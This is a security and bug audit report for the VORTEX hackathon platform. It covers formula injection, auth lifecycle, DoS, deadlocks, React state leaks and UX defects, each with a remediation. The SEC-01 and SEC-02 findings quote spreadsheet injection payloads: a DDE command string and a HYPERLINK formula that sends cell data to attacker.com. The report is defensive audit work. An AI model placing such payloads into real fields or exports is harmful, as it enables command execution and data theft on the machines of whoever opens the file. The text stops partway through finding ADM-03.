# Additional Known Issues & Vulnerabilities

**Audit Date:** 2026-11-20 (Updated 2026-11-21 post-pull delta)  
**Target Repository:** VORTEX (`c:\Users\rohit jain\OneDrive\Documents\work\techXpress\VORTEX`)  
**Complementary To:** [KNOWN_ISSUES.md](KNOWN_ISSUES.md) & [GITHUB_ISSUES.md](GITHUB_ISSUES.md)  
**Methodology & Skills Applied:**
- `find-bugs`: Systematic static analysis, attack surface mapping, boundary checks, and logic tracing.
- `security-audit`: OWASP Top 10 & CWE vulnerability analysis, denial of service vectors, authentication lifecycles.
- `api-security-testing`: REST and Socket.IO endpoint verification, authorization, and rate-limiting keying.
- `systematic-debugging`: Root cause diagnosis, reproduction flows, and regression tracing.
- `software_architecture`: Concurrency models, event propagation, and transactional invariants.
- `database-design`: PostgreSQL connection pool limits, composite keys, and relational cascading.
- `performance-profiling`: CPU threadpool saturation, unpaginated dataset memory bloat, and socket leaks.
- `enhance_ui`: Component lifecycle safety, modal state persistence hazards, and DOM reactivity.
- `ui_ux_pro_max`: Navigation dead-ends, form validation affordances, and administrative telemetry clarity.

---

## Severity Matrix Summary

| ID | Issue Description | Severity | Status | Category | File Reference |
|---|---|---|---|---|---|
| **SEC-01** | Spreadsheet Formula Injection in Testing Import Export (CWE-1236) | **High** | Open | Security / Injection | [backend/src/controllers/testingImport.controller.js:143](backend/src/controllers/testingImport.controller.js#L143) |
| **SEC-02** | Spreadsheet Formula Injection in Audit Log Export (CWE-1236) | **High** | Open | Security / Injection | [backend/src/controllers/audit.controller.js:58](backend/src/controllers/audit.controller.js#L58) |
| **SEC-03** | Distributed Account Lockout Denial of Service via Email-Keyed Rate Limiting | **High** | **NEW** | Security / Auth DoS | [backend/src/middleware/rateLimit.js:40](backend/src/middleware/rateLimit.js#L40) |
| **AUTH-01** | Email Failure Silently Locks Student Out Permanently | **High** | Open | Auth / Credentials | [backend/src/controllers/coordinatorVerification.controller.js:37](backend/src/controllers/coordinatorVerification.controller.js#L37) |
| **AUTH-03** | Password Reissue Fails to Revoke Active JWT Sessions & Realtime Sockets | **High** | **NEW** | Auth / Session Lifecycle | [backend/src/services/user.service.js:237](backend/src/services/user.service.js#L237) |
| **PERF-01** | Node.js Threadpool Starvation & DoS via Sequential Bulk Bcrypt Hashing | **High** | Open | Performance / DoS | [backend/src/services/testingImport.service.js:103](backend/src/services/testingImport.service.js#L103) |
| **PERF-02** | PostgreSQL Connection Pool Exhaustion via Unpaginated N+1 Query Storm | **High** | Open | Database / Stability | [backend/src/controllers/adminVerification.controller.js:19](backend/src/controllers/adminVerification.controller.js#L19) |
| **PERF-04** | Unpaginated Student Directory Floods Server Bandwidth & Client Memory | **High** | **NEW** | Performance / Memory | [backend/src/services/directory.service.js:33](backend/src/services/directory.service.js#L33) |
| **CONC-01** | PostgreSQL Deadlocks during Concurrent Evaluation Submissions (`reRankAll`) | **High** | Open | Concurrency / DB | [backend/src/services/leaderboard.service.js:47](backend/src/services/leaderboard.service.js#L47) |
| **DATA-01** | Disqualified Teams Eligible for Innovation, Presentation & Domain Awards | **High** | **Resolved** | Business Logic / Data | [backend/src/services/awards.service.js:34](backend/src/services/awards.service.js#L34) |
| **DATA-06** | Member Revocation from Finalized Team Silently Violates Invariants | **High** | **NEW** | Business Logic / State | [backend/src/services/membership.service.js:267](backend/src/services/membership.service.js#L267) |
| **JURY-01** | Evaluation Modal State Retention Leaks Previous Team's Score & Notes | **High** | Open | UI / Jury Workflow | [frontend/src/pages/jury/JuryDashboardPage.jsx:92](frontend/src/pages/jury/JuryDashboardPage.jsx#L92) |
| **CONF-01** | `teamLockdown` Global Freeze Switch Completely Missing from Admin UI | **Medium** | **Resolved** | Config / Admin UI | [frontend/src/pages/admin/AdminRulesPage.jsx:32](frontend/src/pages/admin/AdminRulesPage.jsx#L32) |
| **DATA-04** | Problem Statement Domain Reassignment Violates Team Invariant | **Medium** | Open | Data Integrity | [backend/src/services/taxonomy.service.js:123](backend/src/services/taxonomy.service.js#L123) |
| **DATA-05** | Seed Script Wipes Custom Admin-Created Taxonomy on Every Run | **Medium** | Open | Operations / Data | [backend/prisma/seed.js:223](backend/prisma/seed.js#L223) |
| **DATA-07** | Team Reinstate Erases Historical Admin Override Audit Flag | **Medium** | **NEW** | Data Integrity / Audit | [backend/src/services/teamAdmin.service.js:112](backend/src/services/teamAdmin.service.js#L112) |
| **UX-01** | Registry Bulk Upload Fails on Valid Data Due to Database CUID Requirement | **Medium** | Open | Functional / UX | [backend/src/validators/registry.schema.js:7](backend/src/validators/registry.schema.js#L7) & [AdminRegistryPage.jsx:15](frontend/src/pages/admin/AdminRegistryPage.jsx#L15) |
| **SYNC-01** | Missing Real-Time Socket Notification on Round State Transitions | **Medium** | Open | Real-Time Sync | [backend/src/controllers/roundControl.controller.js:9](backend/src/controllers/roundControl.controller.js#L9) |
| **DATA-02** | Non-Transactional Bulk User Import Causes Inconsistent Partial States | **Medium** | Open | Data Integrity | [backend/src/services/testingImport.service.js:47](backend/src/services/testingImport.service.js#L47) |
| **AUD-01** | Disband Workflow Permanently Deletes Historical Dual-Approval Records | **Medium** | Open | Compliance / Audit | [backend/src/services/membershipChange.service.js:264](backend/src/services/membershipChange.service.js#L264) |
| **PERF-03** | Sequential N-Transaction Team Recompute Causes HTTP 504 Gateway Timeouts | **Medium** | Open | Performance / Scaling | [backend/src/services/rules.service.js:230](backend/src/services/rules.service.js#L230) |
| **FLOW-01** | Orphan Leave Request & Deadlock on Leadership Transfer | **Medium** | Open | Workflow / State | [backend/src/services/team.service.js:357](backend/src/services/team.service.js#L357) |
| **ACCESS-01**| Admins Blocked from Viewing Standings when Leaderboard is Hidden | **Medium** | Open | Access Control / UX | [backend/src/controllers/leaderboard.controller.js:8](backend/src/controllers/leaderboard.controller.js#L8) |
| **INFRA-01** | Nginx Socket.IO Long-Polling Drop on Misconfigured Connection Upgrade | **Medium** | Open | Reverse Proxy / Realtime | [frontend/nginx.conf:31](frontend/nginx.conf#L31) |
| **STU-01** | Form URL Inputs Silently Reject Plain Links Without `https://` | **Medium** | **Resolved** | UX / Registration | [frontend/src/pages/public/RegistrationPage.jsx:457](frontend/src/pages/public/RegistrationPage.jsx#L457) |
| **STU-02** | 1500px Registration Form Fails to Scroll to Validation Errors | **Medium** | **Resolved** | UX / Accessibility | [frontend/src/pages/public/RegistrationPage.jsx:230](frontend/src/pages/public/RegistrationPage.jsx#L230) |
| **STU-03** | Registration Page Renders Active Form When Registration is Disabled | **Medium** | **Partially Resolved** | UX / Rules Engine | [frontend/src/pages/public/RegistrationPage.jsx:428](frontend/src/pages/public/RegistrationPage.jsx#L428) |
| **ADM-01** | Admin & Coordinator Navigation Bars Lack Links to Public Pages | **Medium** | Open | UX / Navigation | [frontend/src/components/layout/TopAppBar.jsx:33](frontend/src/components/layout/TopAppBar.jsx#L33) |
| **ADM-02** | "Qualified Teams" Dashboard Counter Counts Down as Teams Finalize | **Medium** | Open | UI / Metrics Display | [frontend/src/pages/admin/AdminOverviewPage.jsx:21](frontend/src/pages/admin/AdminOverviewPage.jsx#L21) |
| **COORD-01**| Filter Search Inputs Mutate Campus Verification Aggregate Stats | **Medium** | Open | UI / Data Binding | [frontend/src/pages/coordinator/CoordinatorVerificationPage.jsx:36](frontend/src/pages/coordinator/CoordinatorVerificationPage.jsx#L36) |
| **ADM-03** | Team Management Dialog Retains Inputs from Previously Managed Team | **Medium** | Open | UI / Admin Workflow | [frontend/src/pages/admin/AdminTeamsPage.jsx:144](frontend/src/pages/admin/AdminTeamsPage.jsx#L144) |
| **AUTH-02** | Revoked Students Remain Authenticated Across Browser Page Refreshes | **Medium** | **Resolved** | Auth / Session Sync | [backend/src/middleware/auth.js:45](backend/src/middleware/auth.js#L45) |
| **UI-01** | TeamChat Uncaught TypeError on Null User Session Crashes Team Page | **Medium** | **NEW** | UI / Runtime Exception | [frontend/src/components/team/TeamChat.jsx:180](frontend/src/components/team/TeamChat.jsx#L180) |
| **DB-01** | Missing Index on AuditLog Forces Full Table Scan on Primary Log View | **Low** | Open | Database / Perf | [backend/prisma/schema.prisma:418](backend/prisma/schema.prisma#L418) |
| **DATA-03** | Domain Deletion Leaves Dangling Unreferenced IDs in `preferredDomains` | **Low** | Open | Schema / Foreign Keys | [backend/src/services/taxonomy.service.js:70](backend/src/services/taxonomy.service.js#L70) |
| **API-01** | CORS Rejection Throws Unhandled Server Error Instead of Rejection Response | **Low** | Open | API / Standards | [backend/src/index.js:47](backend/src/index.js#L47) |
| **INFRA-02** | Windows PowerShell Incompatibility with Makefile Sleep Command | **Low** | Open | Developer Tooling | [Makefile:52](Makefile#L52) |
| **ADM-04** | Admin Accounts Blocked from Inspecting Student Dashboard Perspective | **Low** | Open | UX / Role Testing | [frontend/src/components/layout/RouteGuards.jsx:17](frontend/src/components/layout/RouteGuards.jsx#L17) |
| **RATE-01** | Shared Campus NAT IP Blocks Teammates via Chat Rate Limiter Fallback | **Low** | **NEW** | Network / Rate Limiting | [backend/src/middleware/rateLimit.js:68](backend/src/middleware/rateLimit.js#L68) |
| **OPS-01** | Single-Process In-Memory User Cache Incompatible with Multi-Replicas | **Low** | **NEW** | Operations / Cache Sync | [backend/src/utils/userStatusCache.js:12](backend/src/utils/userStatusCache.js#L12) |

---

## Detailed Findings & Remediations

### SEC-01: Spreadsheet Formula / CSV Injection (CWE-1236) in Testing Import
- **Location:** [backend/src/controllers/testingImport.controller.js:142-154](backend/src/controllers/testingImport.controller.js#L142-L154)
- **Severity:** **High**
- **CWE:** [CWE-1236: Improper Neutralization of Formula Elements in a CSV File](https://cwe.mitre.org/data/definitions/1236.html)
- **Problem:**
  `exportResults` accepts an arbitrary `results` array directly from `req.body.results` and uses SheetJS (`XLSX.utils.json_to_sheet(results)`) to generate an Excel workbook without sanitizing cell values.
- **Evidence & Attack Scenario:**
  Any student or user registering with a malicious payload starting with formula indicators such as `=`, `+`, `-`, or `@` (e.g., `=cmd|'/C calc'!A0` or `=HYPERLINK("http://attacker.com/leak?data=" & A1)`) will have their string placed unescaped into the worksheet. When an organizer downloads the results and opens them in Microsoft Excel or LibreOffice, dynamic formulas execute automatically.
- **Remediation:**
  Prepend a single quote (`'`) to any string field starting with `=`, `+`, `-`, `@`, `\t`, or `\r`.

---

### SEC-02: Spreadsheet Formula Injection in Audit Log Export
- **Location:** [backend/src/controllers/audit.controller.js:42-65](backend/src/controllers/audit.controller.js#L42-L65)
- **Severity:** **High**
- **CWE:** [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html)
- **Problem:**
  In `audit.controller.js:exportXlsx`, user-supplied values (e.g., actor full name, team name, rejection reason, JSON details) are placed directly into SheetJS `json_to_sheet`.
- **Evidence:**
  An attacker creating a team named `=cmd|'/C calc'!A0` or registering with that name creates audit log entries. When an administrator uses the "Export XLSX" button on `/admin/audit`, Excel evaluates the cells as active spreadsheet expressions.
- **Remediation:**
  Sanitize all audit fields (`Summary`, `ActorName`, `DetailsJson`) before converting rows into spreadsheet cells.

---

### AUTH-01: Email Failure Silently Locks Student Out Permanently
- **Location:** [backend/src/controllers/coordinatorVerification.controller.js:33-57](backend/src/controllers/coordinatorVerification.controller.js#L33-L57) & [backend/src/utils/mail.js:78-87](backend/src/utils/mail.js#L78-L87)
- **Severity:** **High**
- **Category:** Authentication / Credential Lifecycle
- **Problem:**
  When a coordinator approves a student, `userService.approveStudent` generates a random 6-digit password, stores its bcrypt hash, and marks the account `VERIFIED`. Next, `sendVerificationApprovedMail` is called:
  ```javascript
  const { user, plaintextPassword } = await userService.approveStudent(req.params.id, { institutionId });
  await sendVerificationApprovedMail({ to: user.email, fullName: user.fullName, password: plaintextPassword });
  // Plaintext password is discarded here. Response does NOT return it to the coordinator.
  ```
- **Evidence:**
  If email sending fails (e.g., Resend API rate limits, network timeouts, invalid domain, or missing API key), `mail.js` catches the error and returns `{ delivered: false }`. The controller ignores this return value and responds with `message: 'User verified and credentials emailed'`.
  Because coordinators are intentionally prevented from seeing the plaintext password and the server only retains the bcrypt hash, the generated password is permanently lost. The student cannot log in, cannot re-register (their status is `VERIFIED`), and the coordinator cannot recover the credentials.
- **Remediation:**
  Check the delivery result. If email delivery fails, roll back the verification or expose an explicit error and password-reissue mechanism for the coordinator.

---

### PERF-01: Node.js Threadpool Starvation & DoS via Sequential Bulk Bcrypt Hashing
- **Location:** [backend/src/services/testingImport.service.js:102-104](backend/src/services/testingImport.service.js#L102-L104)
- **Severity:** **High**
- **Category:** Denial of Service / Asynchronous Concurrency
- **Problem:**
  The bulk import endpoint allows uploading up to 500 rows in a single batch (`testingImport.controller.js:134`). Passwords are generated and hashed one by one using bcrypt with 12 rounds:
  ```javascript
  const plainPassword = cleanString(row.plainPassword, 120) ?? generateSixDigitCode();
  const passwordHash = await hashPassword(plainPassword);
  ```
- **Evidence & Performance Impact:**
  Bcrypt with cost factor 12 takes ~250ms of CPU compute. For 500 users:
  $$\text{Total Blocking Time} = 500 \times 250\text{ms} = 125,000\text{ms} \approx 125\text{ seconds}$$
  Node.js delegates bcrypt computation to `libuv`'s worker thread pool, which defaults to 4 threads (`UV_THREADPOOL_SIZE=4`). 500 sequential hashes monopolize the worker pool for over two minutes, starving all concurrent logins, JWT validations, DNS lookups, and filesystem I/O across the platform.
- **Remediation:**
  Offload bulk user creation to an asynchronous background worker or throttle batch size.

---

### PERF-02: PostgreSQL Connection Pool Exhaustion via Unpaginated N+1 Query Storm
- **Location:** [backend/src/controllers/adminVerification.controller.js:13-28](backend/src/controllers/adminVerification.controller.js#L13-L28)
- **Severity:** **High**
- **Category:** Database Scalability / Resource Exhaustion
- **Problem:**
  In `adminVerification.controller.js:listPending`:
  ```javascript
  const annotated = await Promise.all(
    users.map(async (u) => ({
      ...u,
      registryMatch: await registryService.matchUser({
        registrationNo: u.registrationNo,
        email: u.email,
      }),
    })),
  );
  ```
- **Evidence:**
  `userService.listPending` does not paginate (`take`/`skip` are absent). If 1,000 students have registered:
  1. The server issues 1 query to fetch pending users.
  2. It immediately fires 1,000 concurrent `prisma.collegeRegistry.findUnique` queries.
  Prisma's default connection pool is 10–20 connections. This thundering herd causes connection timeouts (`Timed out fetching a new connection from the pool`), crashing the admin verification dashboard.
- **Remediation:**
  Fetch all matching registry rows in a single batch query using `where: { registrationNo: { in: regNos } }`.

---

### CONC-01: PostgreSQL Deadlocks during Concurrent Evaluation Submissions (`reRankAll`)
- **Location:** [backend/src/services/leaderboard.service.js:47-61](backend/src/services/leaderboard.service.js#L47-L61)
- **Severity:** **High**
- **Category:** Database Concurrency / Race Hazard
- **Problem:**
  Every evaluation submission executes `reRankAll(tx)` inside the scoring transaction:
  ```sql
  UPDATE "LeaderboardEntry" l
  SET "rank" = r.new_rank,
      "updatedAt" = NOW()
  FROM (
    SELECT "teamId",
           CASE WHEN "finalScore" IS NULL THEN NULL ELSE DENSE_RANK() OVER (ORDER BY "finalScore" DESC) END AS new_rank
    FROM "LeaderboardEntry"
  ) r
  WHERE l."teamId" = r."teamId" AND (l."rank" IS DISTINCT FROM r.new_rank)
  ```
- **Evidence:**
  When multiple juries submit scores concurrently, overlapping row locks acquired in arbitrary order trigger PostgreSQL deadlock cycles (`ERROR: 40P01: deadlock detected`), rejecting valid scores with HTTP 500 errors.
- **Remediation:**
  Decouple leaderboard rank recalculation from the synchronous scoring transaction using a debounced background worker or deterministic locking.

---

### DATA-01: Disqualified Teams Eligible for Innovation, Presentation & Domain Awards
- **Location:** [backend/src/services/awards.service.js:32-68](backend/src/services/awards.service.js#L32-L68)
- **Severity:** **High**
- **Category:** Business Logic / Competition Integrity
- **Problem:**
  The awards service calculates metric and domain champions directly from evaluations and leaderboard entries without filtering for team disqualification status.
- **Evidence:**
  `prisma.evaluation.groupBy` groups every submitted score across all teams without checking `team.status`. A team disqualified for plagiarism or cheating will still be declared the winner for `Top Innovation` or `Top Presentation`.
- **Remediation:**
  Exclude disqualified teams by joining against active, finalized teams (`status: 'FINALIZED'`).

---

### CONF-01: `teamLockdown` Global Freeze Switch Completely Missing from Admin UI
- **Location:** [frontend/src/pages/admin/AdminRulesPage.jsx:32-40, 94-98](frontend/src/pages/admin/AdminRulesPage.jsx#L32-L40) & [backend/src/validators/rules.schema.js:16](backend/src/validators/rules.schema.js#L16)
- **Severity:** **Medium**
- **Category:** Configuration / Admin UI Gap
- **Problem:**
  The schema (`rules.schema.js:16`), database (`schema.prisma:384`), and service (`rules.service.js:70-75`) implement `teamLockdown`. When active, all student invites, join requests, and team modifications are blocked. However, `AdminRulesPage.jsx` has NO toggle, form field, or state binding for `teamLockdown`.
- **Evidence:**
  Line 32 of `AdminRulesPage.jsx` creates `patch` with only 7 fields: `minTeamSize`, `maxTeamSize`, `minFemaleMembers`, `minDomainExperts`, `registrationOpen`, `leaderboardVisible`, `showMarks`. `teamLockdown` is omitted. Admins cannot activate competition lockdown through the UI.
- **Remediation:**
  Add a `Toggle` for `teamLockdown` to `AdminRulesPage.jsx` and include it in `save` payload.

---

### DATA-04: Problem Statement Domain Reassignment Violates Team Invariant
- **Location:** [backend/src/services/taxonomy.service.js:117-135](backend/src/services/taxonomy.service.js#L117-L135) & [backend/src/services/team.service.js:126](backend/src/services/team.service.js#L126)
- **Severity:** **Medium**
- **Category:** Data Integrity / Relational Invariant
- **Problem:**
  `problemStatementService.update` allows admins to change a problem statement's `domainId`.
- **Evidence:**
  If 10 teams have already formed under Domain A selecting Problem Statement X, and an admin subsequently moves Problem Statement X to Domain B:
  The 10 teams now have `team.domainId = A` and `ps.domainId = B`. This directly violates the rule invariant enforced during team creation (`ps.domainId === team.domainId`).
- **Remediation:**
  Reject changing `domainId` on a problem statement if teams are currently associated with it (`where: { psId: id }`).

---

### DATA-05: Seed Script Wipes Custom Admin-Created Taxonomy on Every Run
- **Location:** [backend/prisma/seed.js:229-250, 387-412](backend/prisma/seed.js#L229-L250)
- **Severity:** **Medium**
- **Category:** Operations / Data Loss
- **Problem:**
  `seed.js` includes automated cleanup routines (`cleanupInstitutions`, `seedTaxonomy`) that delete any Institution, Domain, or Problem Statement whose name is not part of the hardcoded seed arrays.
- **Evidence:**
  If an organizer adds a new college (e.g. "IIT Bhubaneswar") or a custom sponsor problem statement in the admin UI, and later runs `make seed-full` or `npm run db:seed` before students join it, the cleanup routines identify it as "outdated" and permanently delete it.
- **Remediation:**
  Remove aggressive deletion of unlisted institutions and domains from the seed script, or flag seed-managed entries with an `isDefault` column.

---

### FLOW-01: Orphan Leave Request & Deadlock on Leadership Transfer
- **Location:** [backend/src/services/team.service.js:357-399](backend/src/services/team.service.js#L357-L399) & [backend/src/services/membershipChange.service.js:278](backend/src/services/membershipChange.service.js#L278)
- **Severity:** **Medium**
- **Category:** State Machine / Dual-Approval Workflow
- **Problem:**
  If Member B submits a request to `LEAVE` Team T (approver is Leader A), and Leader A transfers leadership to Member B before approving or denying the request:
  1. Member B is promoted to Leader; Leader A is demoted to Member.
  2. The pending `LEAVE` request remains active in the database with `approverId: A` and `targetUserId: B`.
  3. If old leader A approves it, the execution calls `removeMember` on Leader B, which throws `Conflict('Cannot remove the team leader')`.
  4. The leave request is permanently orphaned and cannot be resolved through the normal UI.
- **Remediation:**
  Inside `teamService.transferLeadership`, cancel all pending `LEAVE` and `DISMISS` requests involving the previous and new leader.

---

### ACCESS-01: Admins Blocked from Viewing Standings when Leaderboard is Hidden
- **Location:** [backend/src/controllers/leaderboard.controller.js:4-10](backend/src/controllers/leaderboard.controller.js#L4-L10)
- **Severity:** **Medium**
- **Category:** Access Control / RBAC
- **Problem:**
  When `rules.leaderboardVisible` is `false`:
  ```javascript
  export const list = async (req, res) => {
    const { hidden, showMarks, entries } = await leaderboardService.list({ limit: req.query.limit });
    if (hidden) throw Forbidden('Leaderboard is currently hidden');
    res.json({ showMarks, count: entries.length, entries });
  };
  ```
- **Evidence:**
  The check ignores `req.user?.role`. When organizers hide the leaderboard from public view prior to closing ceremonies, administrators themselves cannot inspect standings on the web portal without re-enabling it for everyone.
- **Remediation:**
  Bypass `hidden` if `req.user?.role === 'ADMIN'`.

---

### INFRA-01: Nginx Socket.IO Long-Polling Drop on Misconfigured Connection Upgrade
- **Location:** [frontend/nginx.conf:27-34](frontend/nginx.conf#L27-L34)
- **Severity:** **Medium**
- **Category:** Reverse Proxy / Realtime Transport
- **Problem:**
  In `nginx.conf`:
  ```nginx
  location /socket.io/ {
    proxy_pass         http://backend:3001;
    proxy_http_version 1.1;
    proxy_set_header   Upgrade     $http_upgrade;
    proxy_set_header   Connection  "upgrade";
    ...
  }
  ```
- **Evidence:**
  Unconditionally sending `Connection: "upgrade"` on HTTP long-polling requests (`/socket.io/?transport=polling`) where `$http_upgrade` is empty violates RFC 7230 and causes proxy connection drops in environments where WebSockets are blocked or fail to negotiate.
- **Remediation:**
  Use an Nginx `map` block:
  ```nginx
  map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
  }
  ...
  proxy_set_header Connection $connection_upgrade;
  ```

---

### DB-01: Missing Index on AuditLog Forces Full Table Scan on Primary Log View
- **Location:** [backend/prisma/schema.prisma:418](backend/prisma/schema.prisma#L418) & [backend/src/services/audit.service.js:80](backend/src/services/audit.service.js#L80)
- **Severity:** **Low**
- **Category:** Database Query Optimization
- **Problem:**
  `AuditLog` defines indexes `@@index([action, createdAt])` and `@@index([entityType, entityId])`. The default admin browse query (`auditService.list`) executes `ORDER BY "createdAt" DESC LIMIT 100` without filtering by `action`.
- **Evidence:**
  In PostgreSQL B-tree composite indexes, `(action, createdAt)` cannot be used for sorting without an equality predicate on the leading column `action`. Every browse query results in a full table scan and in-memory sort.
- **Remediation:**
  Add a standalone index: `@@index([createdAt])`.

---

### INFRA-02: Windows Incompatibility with Makefile Sleep Command
- **Location:** [Makefile:52](Makefile#L52)
- **Severity:** **Low**
- **Category:** Developer Tooling / Portability
- **Problem:**
  Target `launch` runs `@sleep 5`. On Windows workstations without GNU coreutils, running `make launch` fails with `'sleep' is not recognized as an internal or external command`.
- **Remediation:**
  Replace with a cross-platform command or Docker wait mechanism.

---

## User & Admin Usability / Operational Issues

### JURY-01: Evaluation Modal Retains Previous Team's Score & Notes (State Leak)
- **Location:** [frontend/src/pages/jury/JuryDashboardPage.jsx:92-99, 359-367](frontend/src/pages/jury/JuryDashboardPage.jsx#L92-L99)
- **Severity:** **High**
- **Category:** Jury Workflow / React Lifecycle Defect
- **Problem:**
  In `ScoreModal`, metric scores and feedback text are initialized with `useState`:
  ```javascript
  const [scores, setScores] = useState(() => ({
    innovation:   existing?.innovation   ?? 5,
    complexity:   existing?.complexity   ?? 5,
    presentation: existing?.presentation ?? 5,
    impact:       existing?.impact       ?? 5,
    feasibility:  existing?.feasibility  ?? 5,
  }));
  const [feedback, setFeedback] = useState(existing?.feedback ?? '');
  ```
  In React, returning `null` when `team` is null does **not** unmount the component instance if the `<ScoreModal />` element remains at the same position in the parent JSX. Because `<ScoreModal />` lacks a `key` prop and lacks an explicit `useEffect` watching `team?.id` or `round`, closing the modal and opening a different team reuses the previous instance's local state.
- **Evidence & Real-World User Impact:**
  A jury member opens Team A, moves the sliders to 9, 8, 9, 9, 8, and types detailed critique in the feedback box. If they close the modal to check team details and then open Team B, **Team A's scores and feedback remain pre-populated in Team B's modal**. If the jury clicks "Save Evaluation", Team A's evaluation is submitted under Team B.
- **Remediation:**
  Mount `ScoreModal` conditionally or supply a dynamic key:
  ```jsx
  {active && !active.view && (
    <ScoreModal
      key={`${active.team.id}-${active.round}`}
      open={true}
      team={active.team}
      round={active.round}
      existing={active.evalRow}
      roundUnlocked={rounds.data?.control?.[ROUND_FIELD[active.round]] === 'UNLOCKED'}
      onClose={() => setActive(null)}
      onSaved={refresh}
    />
  )}
  ```

---

### STU-01: Form URL Inputs Silently Reject Plain Links Without `https://`
- **Location:** [frontend/src/pages/public/RegistrationPage.jsx:454-487](frontend/src/pages/public/RegistrationPage.jsx#L454-L487) & [backend/src/validators/registration.schema.js:3](backend/src/validators/registration.schema.js#L3)
- **Severity:** **Medium**
- **Category:** User Experience / Registration Onboarding
- **Problem:**
  The registration inputs for LinkedIn, GitHub, Portfolio, and Drive links use native HTML5 `type="url"` attributes and backend Zod validation `z.string().url()`.
- **Evidence & Real-World User Impact:**
  Students overwhelmingly copy-paste profiles in standard formats such as `github.com/alice` or `linkedin.com/in/bob`. Because these lack an explicit `http://` or `https://` scheme, the browser blocks form submission with a browser-native tooltip, or the backend returns `VALIDATION_ERROR: Invalid url`.
- **Remediation:**
  Normalize URL fields before validation in `sanitizePayload`:
  ```javascript
  const normalizeUrl = (str) => {
    if (!str || typeof str !== 'string') return undefined;
    const trimmed = str.trim();
    if (!trimmed) return undefined;
    return /^https?:\/\//i.test(trimmed) ? trimmed : `https://${trimmed}`;
  };
  ```

---

### STU-02: 1500px Registration Form Fails to Scroll to Validation Errors
- **Location:** [frontend/src/pages/public/RegistrationPage.jsx:226-231](frontend/src/pages/public/RegistrationPage.jsx#L226-L231)
- **Severity:** **Medium**
- **Category:** User Experience / Accessibility
- **Problem:**
  The registration page has 5 large glassmorphic sections totaling over 1,500 vertical pixels. When form submission fails due to validation errors (e.g. invalid phone number format, missing domain selection, or invalid year of study), the handler executes:
  ```javascript
  setErrors(flat);
  toast.error('Please correct the highlighted fields.');
  ```
  Only the *success* block calls `window.scrollTo({ top: 0, behavior: 'smooth' })`.
- **Evidence & Real-World User Impact:**
  The user is anchored at the bottom of the page next to the "Submit Application" button. When the toast fires, no error is visible in the viewport. The applicant has to guess and scroll up through 25 inputs across 5 screens to find which red border triggered the rejection.
- **Remediation:**
  Query the first element matching `[aria-invalid="true"]` or `.border-accent-crimson` and invoke `.scrollIntoView({ behavior: 'smooth', block: 'center' })`.

---

### STU-03: Registration Page Renders Active Form When Registration is Disabled
- **Location:** [frontend/src/pages/public/RegistrationPage.jsx:200-240](frontend/src/pages/public/RegistrationPage.jsx#L200-L240) & [backend/src/services/rules.service.js:14](backend/src/services/rules.service.js#L14)
- **Severity:** **Medium**
- **Category:** User Experience / Rules Engine
- **Problem:**
  The rules service contains a global `registrationOpen` flag. However, `RegistrationPage` does not fetch `/api/rules` or check `rules.registrationOpen`.
- **Evidence & Real-World User Impact:**
  When organizers close registration, prospective participants still see the full, active registration form. They can spend 15 minutes filling in personal, academic, domain, and project details, only to be rejected upon pressing submit.
- **Remediation:**
  Fetch the public event rules on mount. If `registrationOpen === false`, render a prominent "Registration is currently closed" banner and disable form fields.

---

### ADM-01: Admin & Coordinator Navigation Bars Lack Links to Public Pages
- **Location:** [frontend/src/components/layout/TopAppBar.jsx:33](frontend/src/components/layout/TopAppBar.jsx#L33) & [frontend/src/components/layout/AdminShell.jsx:10-20](frontend/src/components/layout/AdminShell.jsx#L10-L20)
- **Severity:** **Medium**
- **Category:** User Experience / Navigation Dead-Ends
- **Problem:**
  In `TopAppBar.jsx`:
  ```javascript
  if (pathname.startsWith('/admin') || pathname.startsWith('/coordinator')) return null;
  ```
  When navigating within `/admin` or `/coordinator`, the top header is unmounted, and the sidebar only renders administrative routes.
- **Evidence & Real-World User Impact:**
  Organizers and coordinators have no buttons or links to view the live public `/leaderboard`, `/problem-statements`, or `/awards`. To check what participants and sponsors see, administrators must manually edit the browser's address bar or open an incognito window.
- **Remediation:**
  Add a "Public Portal" section or quick-action link in `AdminShell` and `CoordinatorShell` with links to `/`, `/leaderboard`, and `/problem-statements`.

---

### ADM-02: "Qualified Teams" Dashboard Counter Counts Down as Teams Finalize
- **Location:** [frontend/src/pages/admin/AdminOverviewPage.jsx:20-21, 40](frontend/src/pages/admin/AdminOverviewPage.jsx#L20-L21)
- **Severity:** **Medium**
- **Category:** Admin Telemetry / Metrics Inaccuracy
- **Problem:**
  The dashboard calculates qualified teams using an exact match:
  ```javascript
  const finalizedTeams = (teams.data?.teams ?? []).filter((t) => t.status === 'FINALIZED').length;
  const qualifiedTeams = (teams.data?.teams ?? []).filter((t) => t.status === 'QUALIFIED').length;
  ```
- **Evidence & Real-World User Impact:**
  In VORTEX's state machine, a team transitions from `FORMATION` → `QUALIFIED` → `FINALIZED`. As teams finalize their rosters, their status changes from `QUALIFIED` to `FINALIZED`. Consequently, the "Qualified Teams" stat tile counts **downward** toward zero during peak team formation, misleading organizers into thinking teams are disqualifying or losing members.
- **Remediation:**
  Update the counter to include all teams that have achieved qualification:
  ```javascript
  const qualifiedTeams = (teams.data?.teams ?? []).filter((t) => t.status === 'QUALIFIED' || t.status === 'FINALIZED').length;
  ```

---

### COORD-01: Filter Search Inputs Mutate Campus Verification Aggregate Stats
- **Location:** [frontend/src/pages/coordinator/CoordinatorVerificationPage.jsx:26-39](frontend/src/pages/coordinator/CoordinatorVerificationPage.jsx#L26-L39)
- **Severity:** **Medium**
- **Category:** UI / Data Binding Confusion
- **Problem:**
  The Pending and Verified stat badges derive their counts from the active queries:
  ```javascript
  const stats = useMemo(() => ({
    pending: pending.data?.count ?? 0,
    verified: verified.data?.count ?? 0,
  }), [pending.data, verified.data]);
  ```
  Both `pending` and `verified` queries pass `{ query: { search } }`.
- **Evidence & Real-World User Impact:**
  When a campus coordinator types a student's name into the search box to find their record, the "Total Pending in Campus" card immediately drops from (for example) 45 to 1. Coordinators misinterpret this as a glitch or assume all other pending applications have been processed or lost.
- **Remediation:**
  Fetch aggregate stats independently without search filters, or use separate endpoints for summary metrics.

---

### ADM-03: Team Management Dialog Retains Inputs from Previously Managed Team
- **Location:** [frontend/src/pages/admin/AdminTeamsPage.jsx:133-146](frontend/src/pages/admin/AdminTeamsPage.jsx#L133-L146)
- **Severity:** **Medium**
- **Category:** Admin Workflow / React State Retention
- **Problem:**
  In `AdminTeamsPage.jsx`:
  ```javascript
  <ManageModal team={active} onClose={() => setActive(null)} onDone={refresh} />
  ```
